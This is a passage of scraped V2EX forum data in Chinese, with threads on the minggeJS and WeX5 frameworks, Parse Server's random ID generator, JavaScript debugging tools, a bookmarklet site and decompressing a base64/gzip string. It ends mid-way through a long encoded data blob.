"虽然一定程度认可作者的 js 功底，不过写的那个山寨 jQuery 连单元测试都没有，试问谁敢去用，如果你有写单元测试，就当我没说", "我很认真的问：这是一个认真严肃的帖子吗\r", "有一说一，个人来说，国内社区的项目真的不敢用，社区力量有限。比如某个模块加载工具", " 伦师兄，是你吗？", "(本来有着一副做鸭能赚钱的脸，却做起编程)", "哈哈", " 嘘！", " 哈哈哈哈哈哈可以可以", "我就问你们见过 Angular, React 这样子推销的吗? 这还是程序员的社区吗? 看来是时代变了,我已经跟不上了呀.", "等 100%再看.", "我来整理一下楼主的言论，可以用一句话概括就是：\r", "**明哥大法好，用 minggeJS 保平安**\r", "\r", "——邪教年年有，今年特别多(((", "minggeJS1.9.2 已经升级 "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>百度搜 react ，搜到一个推广链接  <a target=\"_blank\" rel=\"nofollow\" href=\"http://wex5.com/cn/\">http://wex5.com/cn/</a>    有用过的么</p>\n</div></div>"], "reply": "33", "tittle": "有人用过 WeX5 么，号称秒杀 angular react 的", "comment": ["百度搜，呵呵。", "没有", "开源的，你可以看看星星。", "我用过，是用 eclipse 改的一个 IDE ，恶心的不要不要的，各种方面", "前有 minggeJS ，后有 WeX5 ，真会耍猴", "百度。。。", " 找了半天没找到 Github repo 在哪。。。", "用 html5+吧， hbuilder 好用", " 他们的 repo 在 OSC", "呵呵", "原来 IDE 是基于 eclipse 的，难怪没看到 demo ……\r", "看了一下代码技术含量还是有的，秒 react 就算了。", "高级黑", "不是 Cordova 都拼错了，_(:з」∠)_", "秒杀，完爆这些现在都快成贬义词了", "他们恶心得很，我搜 amazeui ，也出“秒杀 amazeui ”的推广链", "跟 appcan 、 dcloud 是竞争对手， hybrid 框架，主攻企业市场。市场份额跟前两个差的比较多。跟 angular 、 react 完全不是一个领域的东西。", "国外那些产品又不是神，秒掉他们怎么了？一味怀疑国内产品，挺可悲的。 WeX5 我用来做过 app ，确实一秒之内打开，说“秒开”并不为过。 WeX5 公司的开发工具一直做得不错，商业上也能持续发展，在中国这种对技术普遍不尊重的社会环境下，实属不易。\r", "支持国产的优秀产品都能秒杀洋货！ 包括 Hbulider 、 appcan 这些，希望也能早日有底气秒杀洋货！", "\r", "\r", "好牛逼的样子", "首页一股拼凑出来的感觉。。。", "用过，我们公司用 wex5 开发了很多项目，不错的 html5 应用工具，秒杀可能是为了吸引眼球吧，哪家公司不做广告呢？何必较真，产品好用就行！", "楼上水军出没，贴吧即视感", "V2EX  ›  manong007  ›  全部回复\r", "回复总数  1\r", "2 小时 6 分钟前\r", "回复了 ljcarsenal 创建的主题 › 有人用过 WeX5 么，号称秒杀 angular react 的\r", "国外那些产品又不是神，秒掉他们怎么了？一味怀疑国内产品，挺可悲的。 WeX5 我用来做过 app ，确实一秒之内打开，说“秒开”并不为过。 WeX5 公司的开发工具一直做得不错，商业上也能持续发展，在中国这种对技术普遍不尊重的社会环境下，实属不易。\r", "支持国产的优秀产品都能秒杀洋货！ 包括 Hbulider 、 appcan 这些，希望也能早日有底气秒杀洋货！\r", "\t1/1\r", "\r", "V2EX  ›  erbuer  ›  全部回复\r", "回复总数  1\r", "32 分钟前\r", "回复了 ljcarsenal 创建的主题 › 有人用过 WeX5 么，号称秒杀 angular react 的\r", "用过，我们公司用 wex5 开发了很多项目，不错的 html5 应用工具，秒杀可能是为了吸引眼球吧，哪家公司不做广告呢？何必较真，产品好用就行！\r", "\t1/1", "连他们自己官网都不用的东西...", "搞噱头骗经费", "坑", "号称秒杀就秒杀了, 这么厉害, 怎么不去 Facebook, Google 上班. 把别人家的工程师做宝搞.", "已 block 水军，感谢。", "你们大脑是半导体存储介质？看文档过目不忘？不然怎么折腾得了这么多框架。", "这种东西要是好用还需要百度推广？！", "本来是手机端看到这个帖子，然后忍无可忍必须把电脑打开来评论发表点声音。\r", "\r", "oschina 长期制霸广告位安利其产品\r", "有幸关注过其官方公众号，日常发布的文章标题也符合“秒杀 xx ” “你不用就 xxx ” 诸如此类鸡血词\r", "有幸我司有位小伙伴刚踏入职场的时候入职过该公司，当时是来我二线城市招人，然后拿着二线\r", "的工资长期出差帝都通州某地，干着和一线码农们一样的活。- -\r", "再者，好像但是还经常被拖欠工资 or 补贴，小伙伴看清情况后，迅速撤退。\r", "据说 wex5 的作者属于是国内第一批程序员，然后一直做在从事自主开发平台的研发\r", "一年又一年，终于 wex5 突围了（猜测是从某处拿了投资，有钱了可以做的事就太多了）\r", "\r", "沦陷了 oschina ，没想到还欲沦陷 v2\r", "\r", "呵呵哒，", "还秒杀....  成功案例都没有的宣传就是耍流氓~", "只要开源我就点赞👍", "Hbulider 用的多 可以跨平台 wex5 oschina 上面有人用过 感觉还可以 osx 没法用 我没试"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>今天早上看到微博上喵大 @onevcat 在<a target=\"_blank\" rel=\"nofollow\" href=\"http://weibo.com/2210132365/DfDDgfx0I\">吐槽</a>这段代码 </p>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/ParsePlatform/parse-server/blob/master/RestWrite.js#L704-L715\">https://github.com/ParsePlatform/parse-server/blob/master/RestWrite.js#L704-L715</a></p>\n<div class=\"highlight\"><pre><span class=\"c1\">// Returns a string that's usable as an object id.</span>\n<span class=\"c1\">// Probably unique. Good enough? Probably!</span>\n<span class=\"kd\">function</span> <span class=\"nx\">newObjectId</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">chars</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"s1\">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span> <span class=\"o\">+</span>\n               <span class=\"s1\">'abcdefghijklmnopqrstuvwxyz'</span> <span class=\"o\">+</span>\n               <span class=\"s1\">'0123456789'</span><span class=\"p\">);</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">objectId</span> <span class=\"o\">=</span> <span class=\"s1\">''</span><span class=\"p\">;</span>\n  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"kd\">var</span> <span class=\"nx\">i</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"nx\">i</span> <span class=\"o\">&lt;</span> <span class=\"mi\">10</span><span class=\"p\">;</span> <span class=\"o\">++</span><span class=\"nx\">i</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nx\">objectId</span> <span class=\"o\">+=</span> <span class=\"nx\">chars</span><span class=\"p\">[</span><span class=\"nb\">Math</span><span class=\"p\">.</span><span class=\"nx\">floor</span><span class=\"p\">(</span><span class=\"nb\">Math</span><span class=\"p\">.</span><span class=\"nx\">random</span><span class=\"p\">()</span> <span class=\"o\">*</span> <span class=\"nx\">chars</span><span class=\"p\">.</span><span class=\"nx\">length</span><span class=\"p\">)];</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">return</span> <span class=\"nx\">objectId</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n</pre></div>\n\n<p>如果大家来写这一段代码应该会怎样写？</p>\n</div></div>"], "reply": "19", "tittle": "Facebook 开源的 Parse 后端代码节选...", "comment": ["简单粗暴有效……\r", "\r", "不过现在貌似都是直接用 MongoDB 的 ObjectId 吧", "吐槽没用\r", "\r", "习惯性使用 UUID （ ", " ）", "大致看了下，这个只是一个兼容原 api 的 api 服务端代码", "不必太在意，这个不是真正的，真正的是用 Go 写的。", "简单。。。", "人家都说了 只是 nodejs 的实现而已。", "fb 的不都这样吗,快速开发实现.\r", "hackthon 的", "uuid", "ruby 一行就可以了吧。  [*('a'..'z'),*('A'..'Z'),*('0'..'9')].shuffle[0,9].join", "他吐槽的是碰撞几率吧，而且插入之前不会去验证一下是不是已经存在了吗", " 这种验证应该调用这个方法的地方，自己去验证吧", "其实我觉得这个没有什么问题。\r", "如果要强制 unique ，需要在数据库做一下主键限制", " 我就是这个意思…所以认为那个人注释的槽点很奇怪", "本来就不是 node ，生产环境以前从 Rails 转到 Go 了", " 数据量很大要判断存在应该是个坑吧。", "看了一圈，不知道这个是干嘛的，谁能科普一下", " 生成 id 。", " Parse 问的是这个"]},
{"content": ["<div class=\"topic_content\">Chrome devtool 太强大了，简直就是个 IDE 了，前段时间出了个 devtool ，直接将 chrome 用 eletron 包了下，用来 debug node.js application 简直绝了\r<br>\r<br><a target=\"_blank\" href=\"https://github.com/Jam3/devtool\" rel=\"nofollow\">https://github.com/Jam3/devtool</a>\r<br>\r<br>之前试过用 byebug gem 调试 Rails 应用，那简直是回到了过去（如果谁知道有比 byebug 更好用的麻烦告知一声～）</div>"], "reply": "26", "tittle": "JavaScript 估计是目前动态语言里面 debug 工具最完善了的吧？", "comment": ["有时间试下，我才刚从 alert 更新到 console.log", "王垠：这帮进城务工者真会得瑟。", "Python: 降低你 debug 的能力，提升你不 debug 的能力，呵呵。", "vs 笑而不语", "gdb 一笑而过", "井底之蛤一直以为天是圆的", " ipdb 支持函数变量方法属性自动补全，单步调试，堆栈跟踪，我真不清楚还有什么动态类型语言的调试工具比 python 的更方便。", "就想问下 js 能改寄存器不~", " 动态语言啊哥", "确实是, 我现在在 chrome 里面做游戏, 连编辑器都不用开", "GDB/LLDB 哭晕在厕所， Visual Studio debugger ：呵呵", "感觉 js 的调试是流行的动态语言里边比较渣的了吧。。别的不说， PHP 就直接秒了它", "楼主是对的。。 别的真没哪个动态语言的调试七超过 chrome dev 的。", "微软已经在 ChakraCore 搞了个 Time Travel Debugger 了，准备上半年合进主干……这个才是真厉害\r", "pry_byebug", "我觉得楼主说得挺对的。。。\r", "\r", "php 不清楚， ipdb 和 gdb 似乎只能作为 chrome 开发工具的一部分比较。\r", "\r", "感觉就是 ide 。。。", "Anonymous function....如果 C#也算，还是 VS 好用", "php 有 xdebug ，虽然我一直感觉没有 var_dump 方便，或许是我没有习惯 xdebug ？\r", "另外在这里问一下， xdebug 有办法在控制台 print 出信息吗？有一次在一个开了 xd 的 c9 里跑 wordpress ，数据库配置错了， wordpress 竟然拿中文在控制台里提示我数据库出错。。", "devtool 的确很强大，但有时候用时还是会遇到 bug, 比如 DOM 层级太深无法精确定位，", "lldb 一笑而过", "总是说啥啥一笑而过，啥啥秒了的朋友们，你们是真的清楚 devtools 能做到什么程度吗？\r", "\r", "光是 aync 这一个选项，就没有多少其他 IDE 能做到（当然大部分环境都是用阻塞模式来做 IO ，也不需要这个），然后动态编辑代码热更新（ vs 可以做到）、 sourcemap 对应上其他语言（当然这对于编译型语言的调试就是天生要求的）、断点状态可以执行调试代码（虽然对动态语言不少见），再加上 MS 做的 Time Travel Debugger ，现在的 JS 调试能力确实已经可以说是顶尖水平了……", "devtool 远程调试协议", "楼主明明白白说的是动态语言，楼上一帮拿静态语言说事的是几个意思？", " 看了标题就进来秀优越感", "js 应该是 debug 效率最低的。。原因无他， js 很容易写一些技巧性的写法， debug 起来简直是花样作死。还有异步，事件混在里面。如果写过那种多条异步链相互交叉的复杂逻辑，就明白我的意思了。。这就把原先 1 个问题变成了两个问题。。。。当然，相对轻松。。谈不上牛逼的突破天际。。\r", "个人是特别反感把特别复杂的逻辑用 js 去写的。。暴露出源代码真的好么。。。", "别的不说，光那堆条件断点就秒杀一大片了。\r", "ajax 请求断点\r", "dom 修改断点\r", "动画播放前断点，结束断点\r", "各种事件监听断点\r", "\r", "各种花式 console\r", "console.log\r", "console.warn\r", "console.time\r", "console.table\r", "console.profile\r", "...\r", "\r", "远程调试\r", "上面这些功能都可以远程连接手机浏览器使用。。。\r", "\r", "更不用说变态的网络调试、性能调试、安全性调试这些我都没弄明白的东西了。。。\r", "\r", "说笑而不语的那几个你确定你了解过这些？\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>春节利用各种空闲时间，撸了一个 Js 注入工具网站，收集 / 制作各种 Js 脚本注入工具。<br>\n大家可以通过网站制作自己的 Js 注入小工具，也可以来推荐自己收藏的 Js 注入工具。<br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"http://orz.sxisa.org/\">http://orz.sxisa.org/</a></p>\n</div></div>"], "reply": "11", "tittle": "一个 Js 注入小工具网站", "comment": ["Cool~", "好玩。", "是不是少了个判断啊，点取消也会打开新页面。", "强烈要求\"射击网页\"能把广告也打掉:P", " 没错~制作工具有修掉这个 bug 。", "这玩意不叫 bookmarklet 吗", "常年自己手撸猴子脚本的表示……还是猴子好", "为什么不发布到猴子呢？自己造轮子不好啊", " exactly", " 原来是叫这个～长见识了！", " 这个和油猴脚本还是有差别吧～"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"https://github.com/decaywood/MagicCanvas\" rel=\"nofollow\">https://github.com/decaywood/MagicCanvas</a> 内附 demo\r<br>\r<br>进入demo后，背景会随鼠标位置动态变化</div>"], "reply": "10", "tittle": "这两天撸了一个 js 的动态背景库，喜欢的朋友可以尝试在个人网站上安装", "comment": ["围观了一下 demo ，挺有意思！", "相当酷炫啊！赞一个！", "不错，已 star ，类似效果： ", " 这哥们的库猛多了。。。", "先码为敬", "当多次切换不同效果时，会导致 heart 效果有些卡顿，甚至出现重叠\r", "\r", "已发起一个 pull request ，大家互相探讨", " 感谢你的 pr ！这两天有些忙，改天我会看看的。 ps ：切换效果具体是什么操作？", " 懂你什么意思了，给力的 pr ！", " :smile:", "哎呦这个不错，多谢分享"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>得到的字符串有 140KB ，这里被压缩过了，想解压出来，有什么方法或者提示？目前对这些不熟悉，不知道该查什么？请赐教</p>\n</div></div>"], "reply": "11", "tittle": "通过 javascript 调用 webservice 得到一个压缩过的字符串 在前端有什么方法可以把他解压出来？", "comment": ["什么都没说...\r", "什么压缩格式？\r", "\r", "google javascript zip 直接就能找到相关的库。\r", "\r", "感觉更好的方案是使用 content-encoding:gzip ， web 服务器压缩，浏览器解压，对 js 完全透明。", "uglifyjs 有个 --beautify 选项干这事，只是格式化而已，原来的变量名改不回来了", " base64Binary  gzip 压缩。。原谅我小白", " gzip 解压缩按道理应该浏览器帮你做了， 如果是图片 base64 可以直接丢 img 的 src \r", "src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIA...\" \r", "需要浏览器支持 datauri\r", "你也可以解析成 Uint8Array 获取完整 2 进制信息，参考 ", "是 gzip 技术吗？如果是的话是对开发者透明的，你只需要将 HTTP 服务器设置打开 gzip 压缩， HTTP 服务器就会检测浏览器发来的 Request 头中是否包含 Accept-Encoding:gzip 这样的压缩格式声明，没有的话 HTTP 服务器就提供未压缩的数据，有的话就自动压缩，浏览器会根据 Request 头中的设置自动使用解压算法解压，你在页面上拿到的数据就已经是解压后的了，不需要自己再解压了。\r", "\r", "当然，很可能你问的不是这个。。。", " 非常感谢您的回答，目前确定的是拿到的是经过压缩的。", " 非常感谢！", "```\r", "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